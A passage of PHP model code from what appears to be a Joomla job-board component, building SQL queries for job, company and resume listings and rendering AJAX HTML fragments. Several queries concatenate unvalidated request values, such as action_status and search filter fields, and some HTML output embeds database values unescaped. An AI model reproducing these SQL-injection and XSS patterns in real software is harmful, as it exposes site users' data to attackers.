            $query .= " AND LOWER(company.name) LIKE " . $db->Quote('%' . $searchcompany . '%', false);
        if ($searchjobcategory)
            $query .= " AND job.jobcategory = " . $searchjobcategory;
        if ($searchjobtype)
            $query .= " AND job.jobtype = " . $searchjobtype;


        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT job.*, cat.cat_title, jobtype.title AS jobtypetitle, company.name AS companyname  
				FROM `#__js_job_jobs` AS job 
				JOIN `#__js_job_categories` AS cat ON job.jobcategory = cat.id
				JOIN `#__js_job_jobtypes` AS jobtype ON job.jobtype = jobtype.id 
				LEFT JOIN `#__js_job_companies` AS company ON job.companyid = company.id 
				WHERE job.status <> 0";
        if ($searchtitle)
            $query .= " AND LOWER(job.title) LIKE " . $db->Quote('%' . $searchtitle . '%', false);
        if ($searchcompany)
            $query .= " AND LOWER(company.name) LIKE " . $db->Quote('%' . $searchcompany . '%', false);
        if ($searchjobcategory)
            $query .= " AND job.jobcategory = " . $searchjobcategory;
        if ($searchjobtype)
            $query .= " AND job.jobtype = " . $searchjobtype;

        $query .= " ORDER BY job.created DESC";


        $db->setQuery($query, $limitstart, $limit);
        $this->_application = $db->loadObjectList();

        $lists = array();

        $job_type = $this->getJobType(JText::_('JS_SELECT_JOB_TYPE'));

        $job_categories = $this->getCategories(JText::_('JS_SELECT_JOB_CATEGORY'), '');
        if ($searchtitle)
            $lists['searchtitle'] = $searchtitle;
        if ($searchcompany)
            $lists['searchcompany'] = $searchcompany;
        if ($searchjobcategory)
            $lists['jobcategory'] = JHTML::_('select.genericList', $job_categories, 'searchjobcategory', 'class="inputbox" ' . 'onChange="this.form.submit();"' . 'style="width:115px"', 'value', 'text', $searchjobcategory);
        else
            $lists['jobcategory'] = JHTML::_('select.genericList', $job_categories, 'searchjobcategory', 'class="inputbox" ' . 'onChange="this.form.submit();"' . 'style="width:115px"', 'value', 'text', '');
        if ($searchjobtype)
            $lists['jobtype'] = JHTML::_('select.genericList', $job_type, 'searchjobtype', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"', 'value', 'text', $searchjobtype);
        else
            $lists['jobtype'] = JHTML::_('select.genericList', $job_type, 'searchjobtype', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"', 'value', 'text', '');

        $result[0] = $this->_application;
        $result[1] = $total;
        $result[2] = $lists;
        return $result;
    }

    function & getAllCompaniesListing($companyfor, $limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(id) FROM #__js_job_companies AS company WHERE company.status <> 0";
        if ($companyfor == 1) {
            $query.=" AND company.isgoldcompany!=1";
        } elseif ($companyfor == 2) {
            $query.=" AND company.isfeaturedcompany!=1";
        }
        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT company.*, cat.cat_title 
				FROM #__js_job_companies AS company  
				JOIN #__js_job_categories AS cat ON company.category = cat.id
				WHERE company.status <> 0";
        if ($companyfor == 1) {
            $query.=" AND company.isgoldcompany!=1";
        } elseif ($companyfor == 2) {
            $query.=" AND company.isfeaturedcompany!=1";
        }
        $query .= " ORDER BY company.created DESC";

        $db->setQuery($query, $limitstart, $limit);
        $this->_application = $db->loadObjectList();

        $result[0] = $this->_application;
        $result[1] = $total;

        return $result;
    }

    function & getAllEmpAppsListing($limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(app.id) 
				FROM `#__js_job_resume` AS app 
				JOIN `#__js_job_categories` AS cat ON app.job_category = cat.id
				JOIN `#__js_job_salaryrange` AS salary ON app.jobsalaryrange = salary.id 
				JOIN `#__js_job_jobtypes` AS jobtype ON app.jobtype = jobtype.id 
				JOIN `#__js_job_currencies` AS currency ON app.currencyid=currency.id 
				WHERE app.status <> 0";

        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT app.id, app.application_title,app.first_name, app.last_name, app.jobtype, 
				app.jobsalaryrange, app.create_date, app.status, cat.cat_title, salary.rangestart, salary.rangeend
				, jobtype.title AS jobtypetitle
				,currency.symbol AS symbol
				FROM `#__js_job_resume` AS app 
				JOIN `#__js_job_categories` AS cat ON app.job_category = cat.id
				JOIN `#__js_job_salaryrange` AS salary ON app.jobsalaryrange = salary.id 
				JOIN `#__js_job_jobtypes` AS jobtype ON app.jobtype = jobtype.id 
				JOIN `#__js_job_currencies` AS currency ON app.currencyid=currency.id 
				WHERE app.status <> 0";
        $query .= " ORDER BY app.create_date DESC";

        $db->setQuery($query, $limitstart, $limit);
        $this->_application = $db->loadObjectList();

        $result[0] = $this->_application;
        $result[1] = $total;
        return $result;
    }

    function & getAllJobListings($jobfor, $limitstart, $limit) {
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(job.id) FROM `#__js_job_jobs` AS job
					LEFT JOIN `#__js_job_companies` AS company ON job.companyid = company.id 
					WHERE job.status <> 0";
        if ($jobfor == 1) {
            $query.=" AND job.isgoldjob!=1";
        } elseif ($jobfor == 2) {
            $query.=" AND job.isfeaturedjob!=1";
        }

        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT job.*, cat.cat_title, jobtype.title AS jobtypetitle, company.name AS companyname  
				FROM `#__js_job_jobs` AS job 
				JOIN `#__js_job_categories` AS cat ON job.jobcategory = cat.id
				JOIN `#__js_job_jobtypes` AS jobtype ON job.jobtype = jobtype.id 
				LEFT JOIN `#__js_job_companies` AS company ON job.companyid = company.id 
				WHERE job.status <> 0";

        if ($jobfor == 1) {
            $query.=" AND job.isgoldjob!=1";
        } elseif ($jobfor == 2) {
            $query.=" AND job.isfeaturedjob!=1";
        }

        $query .= " ORDER BY job.created DESC";
        $db->setQuery($query, $limitstart, $limit);
        $this->_application = $db->loadObjectList();

        $lists = array();
        $result[0] = $this->_application;
        $result[1] = $total;
        return $result;
    }

    function & getAppliedResume($searchtitle, $searchcompany, $searchjobcategory, $searchjobtype, $searchjobstatus, $limitstart, $limit) {
        if ($searchjobcategory)
            if (is_numeric($searchjobcategory) == false)
                return false;
        if ($searchjobtype)
            if (is_numeric($searchjobtype) == false)
                return false;
        if ($searchjobstatus)
            if (is_numeric($searchjobstatus) == false)
                return false;
        $db = & JFactory :: getDBO();
        $result = array();
        $query = "SELECT COUNT(job.id) FROM #__js_job_jobs AS job
		JOIN `#__js_job_companies` AS company ON job.companyid = company.id
		WHERE job.status <> 0";
        if ($searchtitle)
            $query .= " AND LOWER(job.title) LIKE " . $db->Quote('%' . $searchtitle . '%', false);
        if ($searchcompany)
            $query .= " AND LOWER(company.name) LIKE " . $db->Quote('%' . $searchcompany . '%', false);
        if ($searchjobcategory)
            $query .= " AND job.jobcategory = " . $searchjobcategory;
        if ($searchjobtype)
            $query .= " AND job.jobtype = " . $searchjobtype;
        if ($searchjobstatus)
            $query .= " AND job.jobstatus = " . $searchjobstatus;

        $db->setQuery($query);
        $total = $db->loadResult();
        if ($total <= $limitstart)
            $limitstart = 0;

        $query = "SELECT job.*, cat.cat_title, jobtype.title AS jobtypetitle, jobstatus.title AS jobstatustitle, company.name AS companyname
				, ( SELECT COUNT(id) FROM `#__js_job_jobapply` WHERE jobid = job.id) AS totalresume
				FROM `#__js_job_jobs` AS job 
				JOIN `#__js_job_categories` AS cat ON job.jobcategory = cat.id
				JOIN `#__js_job_jobtypes` AS jobtype ON job.jobtype = jobtype.id 
				JOIN `#__js_job_jobstatus` AS jobstatus ON job.jobstatus = jobstatus.id 
				JOIN `#__js_job_companies` AS company ON job.companyid = company.id
				WHERE job.status <> 0";
        if ($searchtitle)
            $query .= " AND LOWER(job.title) LIKE " . $db->Quote('%' . $searchtitle . '%', false);
        if ($searchcompany)
            $query .= " AND LOWER(company.name) LIKE " . $db->Quote('%' . $searchcompany . '%', false);
        if ($searchjobcategory)
            $query .= " AND job.jobcategory = " . $searchjobcategory;
        if ($searchjobtype)
            $query .= " AND job.jobtype = " . $searchjobtype;
        if ($searchjobstatus)
            $query .= " AND job.jobstatus = " . $searchjobstatus;

        $query .= " ORDER BY job.created DESC";
        $db->setQuery($query, $limitstart, $limit);
        $this->_application = $db->loadObjectList();

        $lists = array();

        $job_type = $this->getJobType(JText::_('JS_SELECT_JOB_TYPE'));
        $jobstatus = $this->getJobStatus(JText::_('JS_SELECT_JOB_STATUS'));

        $job_categories = $this->getCategories(JText::_('JS_SELECT_JOB_CATEGORY'), '');
        if ($searchtitle)
            $lists['searchtitle'] = $searchtitle;
        if ($searchcompany)
            $lists['searchcompany'] = $searchcompany;
        if ($searchjobcategory)
            $lists['jobcategory'] = JHTML::_('select.genericList', $job_categories, 'searchjobcategory', 'class="inputbox" ' . 'onChange="this.form.submit();"' . 'style="width:115px"', 'value', 'text', $searchjobcategory);
        else
            $lists['jobcategory'] = JHTML::_('select.genericList', $job_categories, 'searchjobcategory', 'class="inputbox" ' . 'onChange="this.form.submit();"' . 'style="width:115px"', 'value', 'text', '');
        if ($searchjobtype)
            $lists['jobtype'] = JHTML::_('select.genericList', $job_type, 'searchjobtype', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"', 'value', 'text', $searchjobtype);
        else
            $lists['jobtype'] = JHTML::_('select.genericList', $job_type, 'searchjobtype', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"', 'value', 'text', '');
        if ($searchjobstatus)
            $lists['jobstatus'] = JHTML::_('select.genericList', $jobstatus, 'searchjobstatus', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"' . 'style="width:115px"', 'value', 'text', $searchjobstatus);
        else
            $lists['jobstatus'] = JHTML::_('select.genericList', $jobstatus, 'searchjobstatus', 'class="inputbox" ' . 'onChange="document.adminForm.submit();"' . 'style="width:115px"', 'value', 'text', '');

        $result[0] = $this->_application;
        $result[1] = $total;
        $result[2] = $lists;
        return $result;
    }

    function &getMyFoldersAJAX($uid, $jobid, $resumeid, $applyid) {
        if ((is_numeric($uid) == false) || ($uid == 0) || ($uid == ''))
            return false;
        if (is_numeric($jobid) == false)
            return false;
        if (is_numeric($resumeid) == false)
            return false;
        $option = 'com_jsjobs';
        $db = &$this->getDBO();
        $canview = 0;
        $myfolders = $this->getMyFoldersForCombo($uid, '');
        if ($myfolders)
            $folders = JHTML::_('select.genericList', $myfolders, 'folderid', 'class="inputbox required" ' . '', 'value', 'text', '');
        else
            $folders = JText::_('YOU_DO_NOT_HAVE_FOLDERS');

        $return_value = "<div id='resumeactionfolder'>\n";
        $return_value .= "<table id='resumeactionfoldertable' cellpadding='0' cellspacing='0' border='1' width='100%'>\n";
        $return_value .= "<tr><td>\n";
        $return_value .= "<table cellpadding='0' cellspacing='0' border='0' width='100%'>\n";
        $return_value .= "<tr class='odd'>\n";
        $return_value .= "<td width='40%' ><b>" . JText::_('JS_FOLDER') . "</b></td>\n";
        $return_value .= "<td >" . $folders . " </td>\n";
        if ($myfolders) {
            $return_value .= "<td width='20'><input type='button' class='button' onclick='saveaddtofolder(" . $applyid . "," . $jobid . "," . $resumeid . ")' value='" . JText::_('JS_ADD') . "'> </td>\n";
        }
        $return_value .= "</tr>\n";
        $return_value .= "</table>\n";
        $return_value .= "</td></tr>\n";
        $return_value .= "</table>\n";
        $return_value .= "</div>\n";
        return $return_value;
    }

    function getMyFoldersForCombo($uid, $title) {
        $db = & JFactory::getDBO();
        if ((is_numeric($uid) == false) || ($uid == 0) || ($uid == ''))
            return false;
        $folders = array();

        $query = "SELECT id, name FROM `#__js_job_folders` WHERE status = 1 AND uid = " . $uid . " ORDER BY name ASC ";

        $db->setQuery($query);
        $rows = $db->loadObjectList();
        if ($db->getErrorNum()) {
            echo $db->stderr();
            return false;
        }

        if ($title)
            $folders[] = array('value' => JText::_(''), 'text' => $title);
        foreach ($rows as $row) {
            $folders[] = array('value' => $row->id, 'text' => $row->name);
        }
        return $folders;
    }

    function &getResumeCommentsAJAX($id) {
        $db = &$this->getDBO();
        if (is_numeric($id) == false)
            return false;
        $query = "SELECT comments,cvid FROM `#__js_job_jobapply` WHERE id = " . $id;
        $db->setQuery($query);
        $row = $db->loadObject();
        $option = 'com_jsjobs';
        $return_value = "<div id='resumeactioncomments'>\n";
        $return_value .= "<table id='resumeactioncommentstable' cellpadding='0' cellspacing='0' border='1' width='100%'>\n";
        $return_value .= "<tr>\n";
        $return_value .= "<td width='20%' ><b>" . JText::_('JS_COMMENTS') . "</b></td>\n";
        $return_value .= "<td width='65%' align='center'>\n";
        $return_value .= "<textarea name='comments' id='comments' rows='3' cols='55'>" . $row->comments . "</textarea>\n";
        $return_value .= "</td>\n";
        $return_value .= "<td align='left' ><input type='button' class='button' onclick='saveresumecomments(" . $id . "," . $row->cvid . ")' value='" . JText::_('JS_SAVE') . "'> </td>\n";
        $return_value .= "</tr>\n";
        $return_value .= "</table>\n";
        $return_value .= "</div>\n";

        return $return_value;
    }

    function getMailForm($uid, $resumeid, $jobapplyid) {
        if ((is_numeric($uid) == false) || ($uid == 0) || ($uid == ''))
            return false;
        if (is_numeric($resumeid) == false)
            return false;
        $db = &$this->getDBO();
        $query = "SELECT 	resume.email_address
				FROM `#__js_job_resume` AS resume
					WHERE resume.id = " . $resumeid;

        $db->setQuery($query);
        $jobseeker_email = $db->loadResult();
        $return_value = "<div  id='resumeactioncandidate'>\n";
        $return_value.= "<table id='resumeactioncandidatetable' cellpadding='0' cellspacing='0' border='0' width='100%'>\n";
        $return_value .= "<tr >\n";
        $return_value .= "<td width='20%' valign='top' ><b>" . JText::_('JS_JOBSEEKER') . ":</b></td>\n";
        $return_value .= "<td width='50%' align='left'>\n";
        $return_value .= "<input name='jsmailaddress' id='jsmailaddress' value='$jobseeker_email' readonly='readonly'/>\n";
        $return_value .= "</td>\n";
        $return_value .= "</tr>\n";
        $return_value .= "<tr >\n";
        $return_value .= "<td width='20%' valign='top' ><b>" . JText::_('JS_SUBJECT_LINE') . ":</b></td>\n";
        $return_value .= "<td width='50%' align='left'>\n";
        $return_value .= "<input type='text' name='jssubject' id='jssubject'/>\n";
        $return_value .= "</td>\n";
        $return_value .= "<tr >\n";
        $return_value .= "<td width='20%' valign='top' ><b>" . JText::_('JS_EMAIL_SENDER') . ":</b></td>\n";
        $return_value .= "<td width='50%' align='left'>\n";
        $return_value .= "<input name='emmailaddress' id='emmailaddress' class='email validate'/>\n";
        $return_value .= "</td>\n";
        $return_value .= "</tr>\n";
        $return_value .= "</table>\n";
        $return_value .= "</div>\n";
        $return_value .= "<div id='resumeactioncandidatecomments'>\n";
        $return_value.= "<table id='resumeactioncandidatecommentstable' cellpadding='0' cellspacing='0' border='0' width='100%'>\n";
        $return_value .= "<tr >\n";
        $return_value .= "<td width='335' align='center'>\n";
        $return_value .= "<textarea name='candidatemessage' id='candidatemessage' rows='5' cols='38'></textarea>\n";
        $return_value .= "</td>\n";
        $return_value .= "<td align='left' ><input type='button' class='button' onclick='sendmailtocandidate(" . $jobapplyid . ")' value='" . JText::_('JS_SEND') . "'> </td>\n";
        $return_value .= "</tr>\n";
        $return_value .= "</table>\n";
        $return_value .= "</table>\n";
        $return_value .= "</div>\n";

        return $return_value;
    }

    function sendToCandidate($data) {
        $senderName = "";
        $senderemail = $data[0];
        $recipient = $data[1];
        $msgBody = $data[3];
        $msgSubject = $data[2];
        $message = & JFactory::getMailer();
        $message->addRecipient($recipient); //to email
        $message->setSubject($msgSubject);
        $message->setBody($msgBody);
        $sender = array($senderemail, $senderName);
        $message->setSender($sender);
        $message->IsHTML(true);
        if (!$message->send())
            $sent = $message->sent();
        else
            $sent = true;
        return $sent;
    }

    function &getResumeDetail($uid, $jobid, $resumeid) {
        if ((is_numeric($uid) == false) || ($uid == 0) || ($uid == ''))
            return false;
        if (is_numeric($jobid) == false)
            return false;
        if (is_numeric($resumeid) == false)
            return false;

        $db = &$this->getDBO();
        $db = & JFactory::getDBO();
        $canview = 1;

        if ($canview == 1) {

            $query = "UPDATE `#__js_job_jobapply` SET resumeview = 1 WHERE jobid = " . $jobid . " AND cvid = " . $resumeid;
            $db->setQuery($query);
            $db->query();

            $query = "SELECT  app.iamavailable
									, app.id AS appid, app.first_name, app.last_name, app.email_address 
									,app.jobtype,app.gender,app.institute,app.institute_study_area ,app.address_state ,app.address_city
									,app.total_experience, app.jobsalaryrange
									, salary.rangestart, salary.rangeend,education.title AS educationtitle
									,currency.symbol
									FROM `#__js_job_resume` AS app
									LEFT JOIN `#__js_job_heighesteducation` AS  education  ON app.heighestfinisheducation=education.id
									LEFT OUTER JOIN  `#__js_job_salaryrange` AS salary	ON	app.jobsalaryrange=salary.id
									LEFT JOIN `#__js_job_currencies` AS  currency  ON app.currencyid=currency.id

					WHERE app.id = " . $resumeid;

            $db->setQuery($query);
            $resume = $db->loadObject();

            $fieldsordering = $this->getFieldsOrderingforForm(3); // resume fields ordering
            if (isset($resume)) {
                $trclass = array('row0', 'row1');
                $i = 0; // for odd and even rows
                $return_value = "<div id='resumedetail'>\n";
                $return_value .= "<div id='resumedetailclose'><input type='button' id='button' class='close_button' onclick='clsjobdetail(\"resumedetail_$resume->appid\")' value='X'> </div>\n";
                foreach ($fieldsordering AS $field) {
                    switch ($field->field) {
                        case 'heighesteducation':
                            if ($field->published == 1) {
                                $return_value .= "<div id='resumedetail_data'>\n";
                                $return_value .= "<span id='resumedetail_data_title' >" . JText::_('JS_EDUCATION') . "</span>\n";
                                $return_value .= "<span id='resumedetail_data_value' >" . $resume->educationtitle . "</span>\n";
                                $return_value .= "</div>\n";
                            }
                            break;
                        case 'institute_institute':
                            if ($field->published == 1) {
                                $return_value .= "<div id='resumedetail_data'>\n";
                                $return_value .= "<span id='resumedetail_data_title' >" . JText::_('JS_INSTITUTE') . "</span>\n";
                                $return_value .= "<span id='resumedetail_data_value' >" . $resume->institute . "</span>\n";
                                $return_value .= "</div>\n";
                            }
                            break;
                        case 'institute_study_area':
                            if ($field->published == 1) {
                                $return_value .= "<div id='resumedetail_data'>\n";
                                $return_value .= "<span id='resumedetail_data_title' >" . JText::_('JS_STUDY_AREA') . "</span>\n";
                                $return_value .= "<span id='resumedetail_data_value' >" . $resume->institute_study_area . "</span>\n";
                                $return_value .= "</div>\n";
                            }
                            break;
                        case 'totalexperience':
                            if ($field->published == 1) {
                                $return_value .= "<div id='resumedetail_data'>\n";
                                $return_value .= "<span id='resumedetail_data_title' >" . JText::_('JS_EXPERIENCE') . "</span>\n";
                                $return_value .= "<span id='resumedetail_data_value' >" . $resume->total_experience . "</span>\n";
                                $return_value .= "</div>\n";
                            }
                            break;
                        case 'Iamavailable':
                            if ($field->published == 1) {
                                $return_value .= "<div id='resumedetail_data'>\n";
                                $return_value .= "<span id='resumedetail_data_title' >" . JText::_('JS_I_AM_AVAILABLE') . "</span>\n";
											if($resume->iamavailable==1) $return_value .= "<span id='resumedetail_data_value' >".JText::_('JS_YES')."</span>\n";
											else $return_value .= "<span id='resumedetail_data_value' >".JText::_('JS_NO')."</span>\n";
                                $return_value .= "</div>\n";
                            }
                            break;
                        case 'salary':
                            if ($field->published == 1) {
                                $return_value .= "<div id='resumedetail_data'>\n";
                                $return_value .= "<span id='resumedetail_data_title' >" . JText::_('JS_CURRENT_SALARY') . "</span>\n";
                                $return_value .= "<span id='resumedetail_data_value' >" . $resume->symbol . $resume->rangestart . ' - ' . $resume->symbol . ' ' . $resume->rangeend . "</span>\n";
                                $return_value .= "</div>\n";
                            }
                            break;
                    }
                }

                $return_value .= "</div>\n";
            }
        } else {
            $return_value = "<div id='resumedetail'>\n";
            $return_value .= "<tr><td>\n";
            $return_value .= "<table cellpadding='0' cellspacing='0' border='0' width='100%'>\n";
            $return_value .= "<tr class='odd'>\n";
            $return_value .= "<td ><b>" . JText::_('JS_YOU_CAN_NOT_VIEW_RESUME_DETAIL') . "</b></td>\n";
            $return_value .= "<td width='20'><input type='button' class='button' onclick='clsjobdetail(\"resumedetail_$resume->appid\")' value=" . JText::_('JS_CLOSE') . "> </td>\n";
            $return_value .= "</tr>\n";
            $return_value .= "</table>\n";

            $return_value .= "</div>\n";
        }

        return $return_value;
    }

    function updateJobApplyActionStatus($jobid, $resumeid, $applyid, $action_status) {
        $db = & JFactory::getDBO();
        $row = &$this->getTable('jobapply');
        $config_email = $this->getConfigByFor('email');

        $comments_data = array();
        $data = JRequest :: get('post');
        if(!is_numeric($applyid)) return false;
        $query = "UPDATE `#__js_job_jobapply` SET action_status =" . $action_status . " WHERE id = " . $applyid;
        $db->setQuery($query);
        if (!$db->query()) {
            switch ($action_status) {
                case 2:
                    $msg = JText :: _('JS_ERROR_MARK_RESUME_AS_SPAM');
                    break;
                case 3:
                    $msg = JText :: _('JS_ERROR_HIRE_JOBSEEKER');
                    break;
                case 1:
                    $msg = JText :: _('JS_ERROR_RESUME_MOVED_TO_INBOX');
                    break;
                case 4:
                    $msg = JText :: _('JS_ERROR_RESUME_REJECTED');
                    break;
                case 5:
                    $msg = JText :: _('JS_ERROR_SAVING_SHORT_LIST_CANDIDATE');
                    break;
            }
        } else {
            switch ($action_status) {
                case 2:
                    $msg = JText :: _('JS_RESUME_HAS_BEEN_MARK_AS_SPAM');
                    break;
                case 3:
                    $msg = JText :: _('JS_JOBSEEKER_HAS_BEEN_HIRED');
                    break;
                case 1:
                    $msg = JText :: _('JS_RESUME_HAS_BEEN_UNMARKED_AS_SPAM_AND_MOVED_TO_THE_INBOX');
                    break;
                case 4:
                    $msg = JText :: _('JS_RESUME_REJECTED');
                    break;
                case 5:
                    $msg = JText :: _('JS_SHORT_LIST_CANDIDATE_SAVED');
                    break;
            }
            if ($config_email['jobseeker_resume_applied_status'] == 1)
                $this->sendMailtoJobseekerAppliedResumeUpdateStatus($jobid, $resumeid, $applyid, $action_status);
        }
        return $msg;
    }

    function sendMailtoJobseekerAppliedResumeUpdateStatus($jobid, $resumeid, $applyid, $action_status) {
        if ($jobid)
            if ((is_numeric($jobid) == false) || ($jobid == 0) || ($jobid == ''))
                return false;
        if ($resumeid)
            if ((is_numeric($resumeid) == false) || ($resumeid == 0) || ($resumeid == ''))
                return false;
        if ($resumeid)
            if ((is_numeric($applyid) == false) || ($applyid == 0) || ($applyid == ''))
                return false;
        $config_email = $this->getConfigByFor('email');
        $db = & JFactory::getDBO();
        $templatefor = 'applied-resume_status';
        $query = "SELECT template.* FROM `#__js_job_emailtemplates` AS template	WHERE template.templatefor = " . $db->Quote($templatefor);
        $db->setQuery($query);
        $template = $db->loadObject();
        $msgSubject = $template->subject;
        $msgBody = $template->body;

        $query = "SELECT resume.uid AS uid, resume.email_address AS email, job.title
			FROM `#__js_job_jobapply` AS apply
			JOIN `#__js_job_resume` AS resume ON apply.cvid=resume.id
			JOIN `#__js_job_jobs` AS job ON apply.jobid=job.id
			WHERE apply.id = " . $applyid;
        $db->setQuery($query);
        $result = $db->loadObject();
        if ($result) {
            switch ($action_status) {
                case 2:
                    $resume_status = "spam";
                    break;
                case 3:
                    $resume_status = "hired";
                    break;
                case 1:
                    $resume_status = "inbox";
                    break;
                case 4:
                    $resume_status = "rejected";
                    break;
                case 5:
                    $resume_status = "shortlist candidate";
                    break;
            }
            if ($result->uid == 0 || $result->uid == '') {
                $jobseekr_name = " Visitor ";
            } else {
                $userquery = "SELECT name, email FROM `#__users` 
									  WHERE id = " . $db->Quote($result->uid);
                $db->setQuery($userquery);
                $user = $db->loadObject();
                $jobseekr_name = " " . $user->name . "  ";
            }
            $job_title = $result->title;
            $jobseeker_email = $result->email;

            $msgBody = str_replace('{JOBSEEKER_NAME}', $jobseekr_name, $msgBody);
            $msgBody = str_replace('{RESUME_STATUS}', $resume_status, $msgBody);
            $msgBody = str_replace('{JOB_TITLE}', $job_title, $msgBody);

            $senderName = $config_email['mailfromname'];
            $senderEmail = $config_email['mailfromaddress'];

            $message = & JFactory::getMailer();
            $message->addRecipient($jobseeker_email); //to email

            $message->setSubject($msgSubject);
            $siteAddress = JURI::base();
            $message->setBody($msgBody);
            $sender = array($senderEmail, $senderName);
            $message->setSender($sender);
            $message->IsHTML(true);
            $sent = $message->send();
            return true;
        }
        return false;
    }

    function storeFolderResume($data) {
        $row = &$this->getTable('folderresume');
        $curdate = date('Y-m-d H:i:s');
        $data['created'] = $curdate;
        $jobid = $data['jobid'];
        $resumeid = $data['resumeid'];
        $folderid = $data['folderid'];
        if ($this->resumeFolderValidation($jobid, $resumeid, $folderid))
            return 3;
        if (!$row->bind($data)) {
            $this->setError($this->_db->getErrorMsg());
            return false;
        }
        if (!$row->check()) {
            $this->setError($this->_db->getErrorMsg());
            return 2;
        }
        if (!$row->store()) {
            $this->setError($this->_db->getErrorMsg());
            return false;
        }
        return true;
    }

    function resumeFolderValidation($jobid, $resumeid, $folderid) {
        $db = & JFactory:: getDBO();
        if ((is_numeric($jobid) == false) || ($jobid == 0) || ($jobid == ''))
            return false;
        if ((is_numeric($resumeid) == false) || ($resumeid == 0) || ($resumeid == ''))
            return false;
        if ((is_numeric($folderid) == false) || ($folderid == 0) || ($folderid == ''))
            return false;
        $query = "SELECT COUNT(id) FROM #__js_job_folderresumes
		WHERE jobid = " . $jobid . " AND resumeid =" . $resumeid . " AND folderid = " . $folderid;
        $db->setQuery($query);
        $result = $db->loadResult();
        if ($result > 0)
            return true;
        else
            return false;
    }

    function storeResumeRating($uid, $ratingid, $jobid, $resumeid, $newrating) {
        $row = &$this->getTable('resumerating');
        $db = &$this->getDBO();
        if ((is_numeric($uid) == false) || ($uid == 0) || ($uid == ''))
            return false;
        if (is_numeric($jobid) == false)
            return false;
        if (is_numeric($resumeid) == false)
            return false;
        $query = "SELECT rating.id
                    FROM `#__js_job_resumerating` AS rating
                        WHERE rating.jobid = " . $jobid . " AND rating.resumeid = " . $resumeid;
        $db->setQuery($query);
        $rating = $db->loadObject();
        $row->rating = $newrating;
        if (isset($rating)) {
            $row->id = $rating->id;
            $row->updated = date('Y-m-d H:i:s');
        } else {
            $row->created = date('Y-m-d H:i:s');
            $row->jobid = $jobid;
            $row->resumeid = $resumeid;
            $row->uid = $uid;
        }
        if (!$row->check()) {
            $this->setError($this->_db->getErrorMsg());
            return 2;
        }
        if (!$row->store()) {
            $this->setError($this->_db->getErrorMsg());
            return false;
        }
        return true;
    }

    function storeResumeComments($data) {
        $row = &$this->getTable('jobapply');
        $row->id = $data['id'];
        $row->comments = $data['comments'];
        if (!$row->check()) {
            $this->setError($this->_db->getErrorMsg());
            return 2;
        }
        if (!$row->store()) {
            $this->setError($this->_db->getErrorMsg());
            return false;
        }
        return true;
    }

    function storeShortListCandidatee($uid, $data) {
        global $resumedata;
        if ($uid)
            if ((is_numeric($uid) == false) || ($uid == 0) || ($uid == ''))
                return false;
        $data = JRequest :: get('post');
        if (is_numeric($data['resumeid']) == false)
            return false;
        if (is_numeric($data['jobid']) == false)
            return false;
        if (is_numeric($uid) == false)
            return false;
        if ($this->shortListCandidateValidation($uid, $data['jobid'], $data['resumeid']) == false)
            return 3;
        $row = &$this->getTable('shortlistcandidate');
        $row->uid = $uid;
        $row->jobid = $data['jobid'];
        $row->cvid = $data['resumeid'];
        $row->status = 0;
        $row->created = date('Y-m-d H:i:s');
        if (!$row->check()) {
            $this->setError($this->_db->getErrorMsg());
            return 2;
        }
        if (!$row->store()) {
            $this->setError($this->_db->getErrorMsg());
            echo $this->_db->getErrorMsg();
            return false;
        }
        return true;
    }

    function & getJobAppliedResume($needle_array, $tab_action, $jobid, $limitstart, $limit) {
        if (is_numeric($jobid) == false)
            return false;
        $db = & JFactory :: getDBO();
        $result = array();
        if (!empty($needle_array)) {
            $needle_array = json_decode($needle_array, true);
            $tab_action = "";
        }
        $query = "SELECT COUNT(job.id)
		FROM `#__js_job_jobs` AS job
		   , `#__js_job_jobapply` AS apply  
		   , `#__js_job_resume` AS app  
		   
		WHERE apply.jobid = job.id AND apply.cvid = app.id AND apply.jobid = " . $jobid;
        if ($tab_action)
            $query.=" AND apply.action_status=" . $tab_action;
        if (isset($needle_array['title']) AND $needle_array['title'] != '')
            $query.=" AND app.application_title LIKE '%" . str_replace("'", "", $db->Quote($needle_array['title'])) . "%'";
        if (isset($needle_array['name']) AND $needle_array['name'] != '')
            $query.=" AND LOWER(app.first_name) LIKE " . $db->Quote('%' . $needle_array['name'] . '%', false);
        if (isset($needle_array['nationality']) AND $needle_array['nationality'] != '')
            $query .= " AND app.nationality = " . $needle_array['nationality'];
        if (isset($needle_array['gender']) AND $needle_array['gender'] != '')
            $query .= " AND app.gender = " . $needle_array['gender'];
        if (isset($needle_array['jobtype']) AND $needle_array['jobtype'] != '')
            $query .= " AND app.jobtype = " . $needle_array['jobtype'];
        if (isset($needle_array['currency']) AND $needle_array['currency'] != '')
            $query .= " AND app.currencyid = " . $needle_array['currency'];
        if (isset($needle_array['jobsalaryrange']) AND $needle_array['jobsalaryrange'] != '')
            $query .= " AND app.jobsalaryrange = " . $needle_array['jobsalaryrange'];
        if (isset($needle_array['heighestfinisheducation']) AND $needle_array['heighestfinisheducation'] != '')
            $query .= " AND app.heighestfinisheducation = " . $needle_array['heighestfinisheducation'];
        if (isset($needle_array['iamavailable']) AND $needle_array['iamavailable'] != '') {
            $available = ($needle_array['iamavailable'] == "yes") ? 1 : 0;
            $query .= " AND app.iamavailable = " . $available;
        }
        if (isset($needle_array['jobcategory']) AND $needle_array['jobcategory'] != '')
            $query .= " AND app.job_category = " . $needle_array['jobcategory'];
        if (isset($needle_array['jobsubcategory']) AND $needle_array['jobsubcategory'] != '')
            $query .= " AND app.job_subcategory = " . $needle_array['jobsubcategory'];
        if (isset($needle_array['experience']) AND $needle_array['experience'] != '')
            $query .= " AND app.total_experience LIKE " . $db->Quote($needle_array['experience']);


        $db->setQuery($query);
